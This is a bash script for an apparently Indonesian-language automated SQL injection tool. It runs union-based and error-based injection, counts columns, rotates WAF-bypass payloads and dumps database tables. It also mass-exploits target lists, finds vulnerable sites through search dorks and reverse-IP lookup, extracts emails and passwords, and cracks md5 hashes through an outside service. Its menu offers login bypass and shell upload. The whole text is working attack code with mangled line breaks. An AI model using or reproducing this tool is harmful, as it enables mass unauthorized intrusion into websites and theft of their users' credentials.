             fi                                                         if curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$base99" | grep -a -Po "(?<=<li>)[\.\:\_\@\[:alnum:]*::\@\.\:\_\[:alnum:]*]*<|(?<=<li>)[[:alnum:]*::\.\:\_\[:alnum:]*]*<|<li>[^:]*::[_/-/./[:alnum:]]*<li>|<li>[^:]*::[_/-/./[:alnum:]]*<|<li>[^<]*<li>|<li>[^<]*<|[<li>_/-/./[:alnum:]]*::[_/-/./[:alnum:]]*<|(?<=&lt;li&gt;)[^&]*|Forbidden|forbidden|Not Acceptable|Internal Server Error" | sed 's/<li>//g' | sed ':a;N;$!ba;s/\n::[[:alnum:]]*/</g' | tr -d "<" | sed '/^$/d' | cut -d '>' -f2 | tr -d '\0' | sed 's/\r$//' > .table                                                           then                                                        if cat .table | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" >/dev/null;then
                   echo -e "${O}\033[2mWAFF Blocked: ${R}`cat .table 2>/dev/null | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" | head -1`${N}"                              continue
                fi                                                         ff=$(cat .table)                                           if [[ "$ff" = "" ]]                                        then
                  echo -e "${R}\033[2mFAILED mencoba dengan dios lain${N}"
                else
                  dump
                  break                                                  fi
          else                                                           echo -e "$N[${R}\033[7;31mCRITICAL${N}]$O F A I L E D try dump dios manual$N"                                     fi
    else                                                          if [[ "$corona" = "y" ]];then
          dk=$(sed "s#${in}#$dor#g" <<< $i2 | sed "s/,,/,/g")                                                                else
          if [[ "$in" = "$i" ]];then                                    dk=$(sed "s#,${in}#,$dor#g" <<< $i2 | sed "s/,,/,/g")
          else                                                          dk=$(sed "s#,${in},#,$dor,#g" <<< $i2 | sed "s/,,/,/g")
       fi;fi
       if [[ "$html" = "y" ]]
       then
          ls=$(echo -e "$param1$union$dk$param2")                    echo -e "${O}Dios: ${N}\033[2m$ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g'
          else
            if [[ "$postd" = "y" ]]                                    then
              ls=$(echo -e "$union$dk")
              ls1=$(echo -e "$postnya=null$ls")                          echo -e "${O}Dios: ${N}\033[2m$ls1" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g'                          else
              ls=$(echo -e "$site$union$dk")                             echo -e "${O}Dios: ${N}\033[2m$ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g'                           fi
       fi                                                         if [[ "$debug" = "y" ]];then                                  echo -e "DIOS : $in $i2 $dk $por \n$ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' #test
       fi                                                         echo -e "DIOS : $ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
       if [[ "$postd" = "y" ]]
       then
          ngeles=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -LX POST "$site" --data "$postnya=null$ls" | tr -d '\0' | sed 's/\r$//')
       else
          ngeles=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$ls" | tr -d '\0' | sed 's/\r$//')
       fi                                                         if echo "$ngeles" | grep -a -Po "(?<=<li>)[\.\:\_\@\[:alnum:]*::\@\.\:\_\[:alnum:]*]*<|(?<=<li>)[[:alnum:]*::\.\:\_\[:alnum:]*]*<|<li>[^:]*::[_/-/./[:alnum:]]*<li>|<li>[^:]*::[_/-/./[:alnum:]]*<|<li>[^<]*<li>|<li>[^<]*<|[<li>_/-/./[:alnum:]]*::[_/-/./[:alnum:]]*<|(?<=&lt;li&gt;)[^&]*|Forbidden|forbidden|Not Acceptable|Internal Server Error" | sed 's/<li>//g' | sed ':a;N;$!ba;s/\n::[[:alnum:]]*/</g' | tr -d "<" | sed '/^$/d' | cut -d '>' -f2 | tr -d '\0' | sed 's/\r$//' > .table                                                 then                                                         if cat .table | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" >/dev/null;then                      echo -e "${O}\033[2mWAFF Blocked: ${R}`cat .table 2>/dev/null | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" | head -1`${N}"                              continue                                                fi                                                         ff=$(cat .table)                                           if [[ "$ff" = "" ]]
         then
            echo -e "${R}${N}[${R}INFO${N}] ${R}FAILED mencoba dengan dios lain${N}"                                           else                                                          dump                                                       break                                                   fi                                                       fi
  fi;done;fi;fi
}

inject() {                                                 echo -n -e "\x1b[0m${N}[${BL}`date +%T`${N}] memulai menghitung order by ~"                                           trap break 4 INT                                           for i in $(seq $order_start $order_by)
  do
    printf "\r\x1b[0m${N}[${BL}`date +%T`${N}] memulai menghitung order by ${i}" $((secs--))
    colom=$(echo -e "0x6b65646a6177336e3"$(seq -s ",0x6b65646a6177336e3" 1 ${i}))                                         #colom=$(seq -s ",0x6b65646a6177336e3" ${i})               if [[ "$based64" = "y" ]]                                  then                                                         st=$(echo "`cut -d "=" -f1 <<< $site`=" )                  bs4=$(echo "null$union$colom-- -" | tr -d "+" | base64 -i)                                                            base64=$(echo "$st$bs4" | tr -d "\n")
      ngecur=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$base64" | tr -d '\0' | sed 's/\r$//' | sed 's/\r$//')
      if [[ "$debug" = "y" ]];then                                  echo -e "$i\n$base64"                                   fi
    else
      if echo "$site" | awk -F "/" '{print $(NF)}' | cut -d "." -f2 | grep -Po "html" >/dev/null
        then
          html="y"                                                   m1=$(echo $site | awk -F "/" '{print $(NF)}' | grep -o "[0-9]*" | head -1)
           if [[ "$m1" = "" ]]
            then
              m2=$(echo $site | awk -F "/" '{print $(NF)}' | grep -Po ".html" | tail -1)                                            param=$(echo "$site" | sed "s/$m2/'$m2/g") #delimiter koma
              param1=$(echo "$param" | cut -d "'" -f1)                   param2=$(echo "$param" | cut -d "'" -f2)
            else
              param=$(echo "$site" | sed "s/$m1/$m1'/g") #delimiter koma
              param1=$(echo "$param" | cut -d "'" -f1)                   param2=$(echo "$param" | cut -d "'" -f2)
            fi
           ngecur=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s  "$param1$union$colom--+$param2" -L | tr -d '\0' | sed 's/\r$//')
         else                                                         if [[ "$postd" = "y" ]]; then
              ngecur=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sX POST  "$site" -L --data "$postnya=null$union$colom--+" | tr -d '\0' | sed 's/\r$//')                           else
              ngecur=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s  "$site$union$colom--+" -L | tr -d '\0' | sed 's/\r$//')                                                        fi
        fi
   fi
   if [[ "$debug" = "y" ]];then #test                            if [[ "$html" = "y" ]];then
        echo "$param1$union$colom--+$param2" #test                 echo -e "$param1$union$colom--+$param2" | sed 's/0x6b65646a6177336e3//g' #test
      else                                                         echo "$ngecur" > sample                                    echo -e "$ngecur\n Query: $site$union$colom--+"
      fi                                                      fi                                                         if [ $? -eq 0 ]
    then
    if echo -e "$ngecur" | grep -Po 'Forbidden|forbidden|Not Acceptable|Internal Server Error | head -1' >/dev/null
      then
       waff="on"                                                  for by in $w1 $w2 $w3 $w4 $w5 $w6 $w7 $w8 $w9 $w10 $union1 $bof $basic_1 $whitespaces $urlencode $double_url $bof2 `cat union.txt 2>/dev/null`
       do
           if [[ "${by}" = "$w3" ]];then                                 union=$(echo -e "/**8**/and/**8**/mod(9,9)/**8**/+${by}UnIoN$w3a/**8**/${by}select$w3a/**8**/")                    else                                                          union=$(echo -e "${by}and${by}mod(9,9)${by}+${by}UnIoN${by}select${by}")                                           fi
         if echo "$by" | grep -aP "UN|un|se|le|ct|io|UniON|UNION|union|uN|SElect|select|SELECT|seleCT" >/dev/null;then            union="${by}"                                              by="$w3"
         fi                                                         echo -e "\n\x1b[0m${N}[${R}`date +%T`${N}] ${N}\033[2mWAF Bypassing${N}\n\x1b[0m${N}[${N}\033[2;35m`date +%T`${N}]${O}\033[2m mencoba bypass dengan $union"                      cek=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$site%27${union}1,2,3--+" | tr -d '\0' | sed 's/\r$//')                                                              if [ $? -eq 0 ]
          then                                                         if echo -e "$cek" | grep -Po 'You are unable to access|Not Acceptable|blocked|connection was reset|Forbidden|forbidden|Not Acceptable|Internal Server Error | head -1' > .waf                                                               then
               echo -e "\x1b[0m${N}[${N}\033[2;35m`date +%T`${N}] ${R}Blocked $union\n\x1b[0m${N}[${N}\033[2;35m`date +%T`${N}]${O}\033[2m WAF Type `cat .waf | head -1`${N}"                else
               echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] ${G}\033[2mWAF Bypased lanjut inject lagi${N}"                              union="$union"                                             echo ".rdy" > .rdy                                         break                                                   fi                                                       else                                                          echo -e "\x1b[0m${N}[${O}`date +%T`${N}] ${R}WAF BLOCKED: $uni\nWAF TYPE: Connection Reset$N" >&2
          fi                                                      done
       if cat .rdy >/dev/null                                     then                                                          sqli
      else                                                           echo -e "\x1b[0m${N}[${R}`date +%T`${N}] ${R}Gagal ${O}coba bypass waff manual"                                   fi                                                         break
    fi                                                         if echo "$ngecur" | grep -Po "kedjaw3n3|kedjaw3n[0-9]*" > .angka                                                        then                                                       if echo "$colom" | grep -Po "," >/dev/null                    then
          corona="n"                                               else
          corona="y"                                              fi                                                         angka=$(cat .angka | cut -d "." -f2 | tr "\n" "," )        mkdir -p output/$dir
       echo -e -n "\a\n\x1b[0m${N}[${G}\033[2m`date +%T`${N}] order by yg di dapat ${i} colom"                               echo -e -n "\n$N[${G}INFO${N}]${G} Site $dir injected $O\n"                                                           info
       echo -e "$info" | sed "s/amp;//g"                          if [[ "$based64" = "y" ]]
         then
          echo -e "Query: $base64" >> output/$dir/log_query.txt
          echo -e "Query: ${N}\033[2m$base64"                        echo -e "${O}angka yg di tampilkan:$G $angka$N\n" | sed 's/kedjaw3n//g'                                            else
          if [[ "$html" = "y" ]]
          then                                                          echo -e "\nQuery $param1$union$colom--+$param2" | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt                                                                    echo -e "$param1$union$colom--+$param2" >> .case1                                                                     echo -e "Query: $param1$union$colom--+$param2" | sed 's/0x6b65646a6177336e3//g' >> $injected_site
             echo -e "Query: ${N}\033[2m$param1$union$colom--+$param2" | sed 's/0x6b65646a6177336e3//g'                            echo -e "${O}angka yg di tampilkan:$G $angka$N\n" | sed 's/kedjaw3n//g'                                            else                                                          if [[ "$postd" = "y" ]]
             then                                                           echo -e "\nQuery $postnya=null$union$colom--+" | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt                                                                     echo -e "Query: $postnya=null$union$colom--+" | sed 's/0x6b65646a6177336e3//g' >> $injected_site                      echo -e "Query: ${N}\033[2m$postnya=null$union$colom--+" | sed 's/0x6b65646a6177336e3//g'
                 echo -e "${O}angka yg di tampilkan:$G $angka$N\n" | sed 's/kedjaw3n//g'
             else                                                           echo -e "$site$union$colom--+" >> .case1
                 echo -e "\nQuery $site$union$colom--+" | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt                  echo -e "Query: $site$union$colom--+" | sed 's/0x6b65646a6177336e3//g' >> $injected_site
                 echo -e "Query:${O}${N}\033[2m $site$union$colom--+" | sed 's/0x6b65646a6177336e3//g'                                 echo -e "${O}angka yg di tampilkan:$G $angka$N\n" | sed 's/kedjaw3n//g'                                           fi
          fi                                                       fi                                                        echo -e "$angka" |  sed 's/kedjaw3n//g' | grep -a -o '[0-9]' > .angka                                                 if echo $mass | grep -Po "y" >/dev/null                    then                                                          break                                                   else                                                       dump_name="y"                                              info                                                     fi                                                           break                                                     else                                                        echo $i > .tmp                                           fi                                                         else                                                         echo -e "\n${R}$N[${R}\033[7;31mCRITICAL${N}]$O connection error: periksa kembali URL atau server down$N" >&2
       break
  fi                                                       done;trap - INT;endspin
}                                                          tanya() {
  echo -e "\n${B}~ ${N}\033[2mBerikan support untuk developer agar tools ini bisa berkembang lgi${N}"                         echo -en "[${R}+${O}] ${N}Your Email: "              read pengguna                                            }
mulai() {                                                           angkab=$(awk 'BEGIN {                                      # seed                                                      srand()                                              for (i=1;i<=1000;i++){                                          print int(1 + rand() * 5)
         }
    }' | head -1)                                              angkam=$(awk 'BEGIN {                                           # seed
          srand()
    for (i=1;i<=1000;i++){
         print int(1 + rand() * 2)                                  }
    }' | head -1)
    clear                                                  banner${angkab}
msg${angkam}
   tanya                                                            #pengguna=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -1)
   configurasi                                                echo -e "${R}Thx your support :)"                          sleep 2
   menu
}
menu() {                                                           angkab=$(awk 'BEGIN {                                       # seed                                                      srand()                                              for (i=1;i<=1000;i++){                                          print int(1 + rand() * 5)                                  }                                                     }' | head -1)                                              angkam=$(awk 'BEGIN {                                           # seed                                                      srand()                                              for (i=1;i<=1000;i++){                                          print int(1 + rand() * 2)                                  }
    }' | head -1)                                              clear                                                  banner${angkab}                                            msg${angkam}                                               echo -e "${N}[${R}@${N}]. ${G}Wellcome injector${N}\n"     if [[ "$debug" = "s" ]];then                                 echo "developer mode string based"                         union="%27$union"                                        fi                                                         if [[ "$debug" = "y" ]];then                                  echo -e "${N}[${R}@${N}]. DEBUG MODE: ${R}ON${N}"       fi
echo -e "\033[1m$N[$R+$N] \e[38;5;81m${O}PSQLI MENU\e[0m
[${O}1${N}]. singgle site injection
[${O}2${N}]. Mass Xploit sql-injection                     [${O}3${N}]. aUTO DorKiNg + AutO Xploit                    [${O}4${N}]. SQLi Base64 injection
[${O}5${N}]. SQLi POST method                              [${O}6${N}]. SQLi ERROR Based method                       [${O}7${N}]. Scan site + auto inject ( web crawler )
[${O}8${N}]. Reverse ip vuln sqli + auto inject
[${O}9${N}]. Query Email Pass dumper + auto filter mail
[${O}10${N}]. Hash tools                                   [${O}11${N}]. Dork generator                               [${O}12${N}]. New Admin Finder                             [${O}13${N}]. Psqli Sqli/Xss/LFI/AdminFinder Scanner       \033[1m$N[$R+$N] ${R}PSQLI FINAL MOD${N} ${O}NEW${N}
[${O}14${N}]. sqli dork dumper${N}                         [${O}15${N}]. auto bypass sql login tools${N}
[${O}16${N}]. dr.dork generator${N}                        [${O}17${N}]. sqli auto upload shell${N}                   [${O}18${N}]. support developer${N}
\033[2mpress Enter for exit${N}"                           echo -ne "[${R}?${N}] yg mana ?? "
read d                                                     case $d in
 1) mass="n"                                                   dump_name="n"                                              waff="n"                                                   clear
    banner${angkab}
    echo -e "                |\033[7;32m SINGGLE SITE XPLOITER ${N}|\n"                                                   echo -en "[${O}?${N}] site: ${O}"
    read site                                                  echo -en "\n"                                                      if echo "$site" | grep -Po "&" >/dev/null
                 then                                                          echo -e "${N}\x1b[0m${N}[${O}\033[2m`date +%T`${N}] ${G}\033[2mdouble parameter found"                                rm -rf .var .var2
                    asq=$(echo $site | grep -ao ".[^&]*" | head -1)                                                                       eq=$(echo $site | grep -ao ".[^&]*" | wc -l)                                                                          echo "$asq" >> .var                                        for iq in `seq 2 $eq`                                      do                                                           var1=$(cut -d "&" -f$iq <<< $site)
                      echo -e "${N}\x1b[0m${N}[${O}\033[2m`date +%T`${N}] ${O}\033[2minjecting parameter $var1${N}"
                      echo -ne "$var1&" >> .var2                                 echo "$asq&`cat .var2`" | sed s/'&$'// >> .var
                    done                                                       trap break INT
                    for site in `cat .var`
                    do                                                            sqli
                    done
                    trap - INT
                 else                                                          sqli                                                    fi
    menu                                                       ;;                                                      2) masn="y"                                                   dump_name="n"
    clear                                                      banner${angkab}
    echo -e "              |\033[7;32m MASS AUTO SQL-i XPLOITER ${N}|\n"
    echo -en "[${O}?${N}] Masukan list taget: ${O}"
    read tar                                                   echo -e "${N}\033[2mLoad site from $tar `wc -l $tar 2>/dev/null | grep -ao "[0-9]*"` url\n"                           echo -e "${N}\033[2mgunakan ctrl+c saat order by untuk skip ke site selanjut nya${N}"                                 rm -rf .case1                                              trap break INT                                             for site in $(cat $tar 2>/dev/null | tr -d '\0' | sed 's/\r$//')                                                         do
        waff="n"
        dump_name="n"                                              union="$union1"                                            if echo "$site" | grep -Po "&" >/dev/null                           then
                    echo -e "${N}\x1b[0m${N}[${O}\033[2m`date +%T`${N}] ${G}\033[2mdouble parameter found"                                rm -rf .var .var2
                    asq=$(echo $site | grep -ao ".[^&]*" | head -1)                                                                       eq=$(echo $site | grep -ao ".[^&]*" | wc -l)                                                                          echo "$asq" >> .var
                    for iq in `seq 2 $eq`
                    do
                      var1=$(cut -d "&" -f$iq <<< $site)
                      echo -e "${N}\x1b[0m${N}[${O}\033[2m`date +%T`${N}] ${O}\033[2minjecting parameter $var1${N}"
                      echo -ne "$var1&" >> .var2
                      echo "$asq&`cat .var2`" | sed s/'&$'// >> .var                                                                      done
                    for site in `cat .var`
                    do
                       sqli
                    done
                 else
                    sqli                                                    fi
    done
    trap - INT
    menu
    ;;                                                       3) masn="y"
     dump_name="n"
     hekel="n"
     clear
     banner${angkab}
     echo -e "              |\033[7;32m aUTO DorKiNg + AutO Xploit ${N}|\n"
     echo -e "[${O}1${N}]. dorking biasa"
      echo -e "[${O}2${N}]. dorking masal"
      echo -e "[${O}3${N}]. kembali ke menu utama"
      echo -ne "[${R}?${N}] yg mana ?? "
      read d
      case $d in                                                  1) masn="y"
          dump_name="n"
          dms="n"                                                    clear
          banner${angkab}                                            echo -e "              |\033[7;32m aUTO DorKiNg + AutO Xploit ${N}|\n"
          echo -ne "[${O}+${N}] Dork sqli: ${O}"
          read do                                                    echo -en "${N}[${R}+${N}] page: ${G}";read pa
          rm -rf .result_dork .not .url .vuln .bad .wp .live                                                                    dork=$(echo "$do" | sed 's/ /+/g')                         trap break INT
          dora #$result_vuln                                         trap - INT
          echo -e "${N}[${R}*${N}] Done.....\n[${G}+${N}] Result vuln sqli saved ${G}$result_vuln${N}"                          echo -e "[${O}+${N}] Result Total : ${G}\033[2m$(cat .result_dork 2>/dev/null | wc -l) site${N}"
          echo -e "[${G}*${N}] Result Total : ${O}\033[2m$(cat .vuln 2>/dev/null | wc -l) Sqli vuln${N}"                        echo -e "[${O}!${N}] Result Total : ${R}\033[2m$(cat .not 2>/dev/null | wc -l) Site not vuln${N}"                     echo -e "[${R}!${N}] Result Total : ${BL}\033[2m$(cat .url 2>/dev/null | wc -l) Url parser${N}"                       echo -e "${N}\033[2mgunakan ctrl+c saat order by untuk skip ke site selanjut nya${N}"
          trap break 2 INT
          masn="y"                                                   dump_name="n"                                              for site in $(cat .vuln 2>/dev/null | sort | uniq -i | tr -d '\0' | sed 's/\r$//')
             do                                                          waff="n"                                                   dump_name="n"                                              union="$union1"                                            if echo "$site" | grep -Po "&" >/dev/null
                       then                                                          echo -e "${N}\x1b[0m${N}[${O}\033[2m`date +%T`${N}] ${G}\033[2mdouble parameter found"
                          rm -rf .var .var2
                          asq=$(echo $site | grep -ao ".[^&]*" | head -1)
                          eq=$(echo $site | grep -ao ".[^&]*" | wc -l)                                                                          echo "$asq" >> .var
                          for iq in `seq 2 $eq`                                      do
                            var1=$(cut -d "&" -f$iq <<< $site)                                                                                    echo -e "${N}\x1b[0m${N}[${O}\033[2m`date +%T`${N}] ${O}\033[2minjecting parameter $var1${N}"                                                                                    echo -ne "$var1&" >> .var2
                            echo "$asq&`cat .var2`" | sed s/'&$'// >> .var                                                                      done
                          for site in `cat .var`
                          do
                             sqli                                                    done                                                    else                                                          sqli
                       fi
          done                                                       trap - INT                                                 rm -rf .vuln                                               menu
        ;;                                                         2) masn="y"
          dump_name="n"
          dms="y"
          clear
          banner${angkab}
          echo -e "              |\033[7;32m Mass aUTO DorKiNg + AutO Xploit ${N}|\n"
          echo -ne "[${O}+${N}] Dork sqli list: ${O}"
          read do                                                    echo -en "${N}[${R}+${N}] page: ${G}";read pa
          rm -rf .result_dork .not .url .vuln .bad .wp .live                                                                    dor=$(cat "$do" | sed 's/ /+/g')
          trap break INT
          for dork in $(echo "$dor")
           do
            trap break 2 INT                                           dora #$result_vuln                                         trap - INT                                                 echo -e "${N}[${R}*${N}] \033[2m$dork Done.....\n[${G}+${N}] Result vuln sqli saved ${G}$result_vuln${N}"             echo -e "[${O}+${N}] Result Total : ${G}\033[2m$(cat .result_dork 2>/dev/null | wc -l) site${N}"
            echo -e "[${G}*${N}] Result Total : ${O}\033[2m$(cat .vuln 2>/dev/null | wc -l) Sqli vuln${N}"                        echo -e "[${O}!${N}] Result Total : ${R}\033[2m$(cat .not 2>/dev/null | wc -l) Site not vuln${N}"                     echo -e "[${R}!${N}] Result Total : ${BL}\033[2m$(cat .url 2>/dev/null | wc -l) Url parser${N}"
          done
          trap - INT                                                 echo -e "${N}\033[2mgunakan ctrl+c saat order by untuk skip ke site selanjut nya${N}"                                 trap break 2 INT                                           masn="y"                                                   dump_name="n"
          for site in $(cat .vuln 2>/dev/null | sort | uniq -i | tr -d '\0' | sed 's/\r$//')                                       do
              waff="n"                                                   dump_name="n"
              union="$union1"
              if echo "$site" | grep -Po "&" >/dev/null
                       then
                          echo -e "${N}\x1b[0m${N}[${O}\033[2m`date +%T`${N}] ${G}\033[2mdouble parameter found"
                          rm -rf .var .var2
                          asq=$(echo $site | grep -ao ".[^&]*" | head -1)
                          eq=$(echo $site | grep -ao ".[^&]*" | wc -l)                                                                          echo "$asq" >> .var
                          for iq in `seq 2 $eq`                                      do
                            var1=$(cut -d "&" -f$iq <<< $site)
                            echo -e "${N}\x1b[0m${N}[${O}\033[2m`date +%T`${N}] ${O}\033[2minjecting parameter $var1${N}"                                                                                    echo -ne "$var1&" >> .var2                                 echo "$asq&`cat .var2`" | sed s/'&$'// >> .var                                                                      done                                                       for site in `cat .var`                                     do
                             sqli                                                    done                                                    else
                          sqli                                                    fi                                            done
          trap - INT                                                 rm -rf .vuln                                               menu                                                    ;;                                                           *) echo -e "${N}[${G}+${N}] Thx for using this tools";;                                                               esac                                                ;;                                                         4) based64="y"                                                masn="n"                                                   waff="n"                                                   clear
     banner${angkab}
     echo -e "                |\033[7;32m BASE64 INJECTION ${N}|\n\n${G}\033[2mKhusus untuk site berparameter base64"
     echo -en "${N}[${R}?${N}] site: ${O}"                      read site
     sqli
     menu                                                    ;;
  5) masn="n"                                                   postd="y"
     waff="n"
     clear                                                      banner${angkab}
     echo -e "                |\033[7;32m SQLI POST METHOD ${N}|\n\n${G}\033[2mkhusus untuk site berparameter post"
     echo -en "${N}[${R}?${N}] site: ${O}"
     read site
     echo -en "${N}[${O}+${N}] parameter: ${G}";read postnya
     sqli
     menu
   ;;
   6) clear                                                     banner${angkab}
     echo -e "                |\033[7;32m ERROR BASED INJECTION $N|\n"                                                     echo -e "[${G}1${N}]. inject biasa"
     echo -e "[${G}2${N}]. inject masal"
     echo -e "[${G}3${N}]. kembali ke menu utama"
     echo -ne "[${R}?${N}] yg mana ?? "                         read d                                                     case $d in
      1) masn="n"                                                  waff="n"                                                   clear
        banner${angkab}
        echo -e "                |\033[7;32m ERROR BASED INJECTION $N|\n"                                                     read -p 'site: ' site                                      esql                                                     ;;                                                         2) clear                                                     banner${angkab}                                            masn="y"                                                   waff="n"                                                   echo -e "                |\033[7;32m ERROR BASED INJECTION + auto xploit masal $N|\n"                                 read -p 'site list: ' file                                 echo -e "${N}\033[2mLoad site : `cat $file 2>/dev/null | wc -l` url"
        trap break 2 INT
        for site in `cat $file 2>/dev/null | tr -d '\0' | sed 's/\r$//'`                                                      do                                                           esql                                                     done                                                       trap - INT                                               ;;                                                         3) menu                                                    ;;                                                            *) echo -e "${N}[${G}+${N}] Thx for using this tools";;                                                               esac
   ;;                                                         7) clear                                                     banner${angkab}                                            echo -e "                |\033[7;32m scan site + auto xploit $N|\n"                                                   echo -e "[${G}1${N}]. scan biasa"                          echo -e "[${G}2${N}]. scan masal"                          echo -e "[${G}3${N}]. kembali ke menu utama"
     echo -ne "[${R}?${N}] yg mana ?? "
     read d
     case $d in                                                  1) masn="n"
        waff="n"
        clear                                                      banner${angkab}
        echo -e "                |\033[7;32m scan site + auto xploit $N|\n"                                                   read -p 'site: ' site
        fuzy
      ;;                                                         2) clear
        banner${angkab}                                            masn="y"
        waff="n"                                                   echo -e "                |\033[7;32m scan site + auto xploit masal $N|\n"
        read -p 'site list: ' file                                 for site in `cat $file`
        do                                                           waff="n"
        fuzy                                                     done
      ;;
      3) menu                                                    ;;                                                            *) echo -e "${N}[${G}+${N}] Thx for using this tools";;                                                               esac                                                 ;;                                                         8) masn="y"
      dms="n"                                                    waff="n"                                                   hekel="y"
      clear                                                      banner${angkab}
      echo -e "                |\033[7;32m Reverse ip vuln sqli + auto inject $N|\n"                                        read -p "site: " site
      get=$(echo $site | sed 's!http[s]*://!!g' | sed 's,/,,g')                                                             asw=$(command -v getent)
      ip=$(curl -sL "http://ip-api.com/php/$site" | grep -Po 'query";s:[^ ]*' | cut -d '"' -f3)
      echo $ip
      pa="1"
      dork=".php%3Fid%3D+ip%3a$ip"
      rm -rf .result_dork .not .url .vuln .bad .wp .live
      trap break INT
      dora #$result_vuln
      trap - INT
      echo -e "${N}[${R}*${N}] Done.....\n[${G}+${N}] Result vuln sqli saved ${G}$result_vuln${N}"
      echo -e "[${O}+${N}] Result Total : ${G}\033[2m$(cat .result_dork 2>/dev/null | wc -l) site${N}"
      echo -e "[${G}*${N}] Result Total : ${O}\033[2m$(cat .vuln 2>/dev/null | wc -l) Sqli vuln${N}"
      echo -e "[${O}!${N}] Result Total : ${R}\033[2m$(cat .not 2>/dev/null | wc -l) Site not vuln${N}"                     echo -e "[${R}!${N}] Result Total : ${BL}\033[2m$(cat .url 2>/dev/null | wc -l) Url parser${N}"
      echo -e "[${O}!${N}] Result Total : ${O}\033[2m$(cat output/$dir/lfi.txt 2>/dev/null | wc -l) LFI${N}"                echo -e "[${R}!${N}] Result Total : ${BL}\033[2m$(cat output/$dir/xss.txt 2>/dev/null | wc -l) xss${N}"               echo -e "${N}\033[2mgunakan ctrl+c saat order by untuk skip ke site selanjut nya${N}"
      trap break 2 INT                                           for site in $(cat .vuln 2>/dev/null | sort | uniq -i | tr -d '\0' | sed 's/\r$//')
         do                                                          waff="n"
          dump_name="n"
          union="$union1"
          if echo "$site" | grep -Po "&" >/dev/null                  then
             echo -e "${N}\x1b[0m${N}[${O}\033[2m`date +%T`${N}] ${G}\033[2mdouble parameter found"                                rm -rf .var .var2
             asq=$(echo $site | grep -ao ".[^&]*" | head -1)
             eq=$(echo $site | grep -ao ".[^&]*" | wc -l)               echo "$asq" >> .var
             for iq in `seq 2 $eq`                                      do
               var1=$(cut -d "&" -f$iq <<< $site)                         echo -e "${N}\x1b[0m${N}[${O}\033[2m`date +%T`${N}] ${O}\033[2minjecting parameter $var1${N}"
               echo -ne "$var1&" >> .var2                                 echo "$asq&`cat .var2`" | sed s/'&$'// >> .var
             done
             for site in `cat .var`                                     do
                sqli                                                    done
          else
             sqli
          fi                                                     done
      trap - INT
      menu                                                    ;;
   9) clear                                                      banner${angkab}
      echo -e "                |\033[7;32m Query Email Pass dumper + auto filter mail ${N}|\n"
      echo -e "[${G}1${N}]. dump biasa"
      echo -e "[${G}2${N}]. dump masal"
      echo -e "[${G}3${N}]. kembali ke menu utama"
      echo -ne "[${R}?${N}] yg mana ?? "                         read p                                                     case $p in                                                   1) clear
           banner${angkab}                                            echo -e "                |\033[7;32m Query Email Pass dumper + auto filter mail ${N}|\n"
           read -p "masukan query sqli yg sudah di dump email passs: " line                                                      line=$(echo "${line}" | sed "s/-- -/--+/g")
           email
           menu
           ;;                                                      2) clear                                                      banner${angkab}
           echo -e "                |\033[7;32m Query Email Pass dumper + auto filter mail ${N}|\n"
           read -p "masukan list file query sqli yg sudah di dump email passs: " file                                            cat $file | while read line
           do
             line=$(echo "${line}" | sed "s/-- -/--+/g")                email
           done
           menu
        ;;
        3) clear;menu
        ;;
        *) clear;menu
        ;;
           esac                                               ;;
   10) clear
      banner${angkab}
      echo -e "                |\033[7;32m Hash tools ${N}|\n"
      echo -e "[${G}1${N}]. hash Identifier"                     echo -e "[${G}2${N}]. md5 decrytor"                        echo -e "[${G}3${N}]. md5 emil pass decrytor"              echo -ne "[${R}?${N}] yg mana ?? "
      read p
      case $p in
        1) clear
           banner${angkab}                                            hashid                                                     menu                                                    ;;                                                         2) clear                                                      banner${angkab}                                            echo -e "                |\033[7;32m md5 decryptor ${N}|\n"
           echo -e "[${G}1${N}]. biasa"
           echo -e "[${G}2${N}]. masal"
           echo -ne "[${R}?${N}] yg mana ?? "
             read p                                                     case $p in                                                  1) clear                                                      banner${angkab}                                            echo -e "                |\033[7;32m md5 decryptor ${N}|\n"                                                           read -p "[+] Hash: " hash                                  dec=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "https://md5decrypt.net/Api/api.php?hash=${hash}&hash_type=md5&email=deanna_abshire@proxymail.eu&code=1152464b80a61728")                                                        if [[ "$dec" = "" ]]                                       then                                                         echo -e "${R}F A I L E D nga bisa di hash${N}"
                 else
                   echo "Result: $dec"                                      fi
                 read -p "Press Enter for continue " aswkxkkxk                                                                         menu                                                    ;;                                                         2) clear
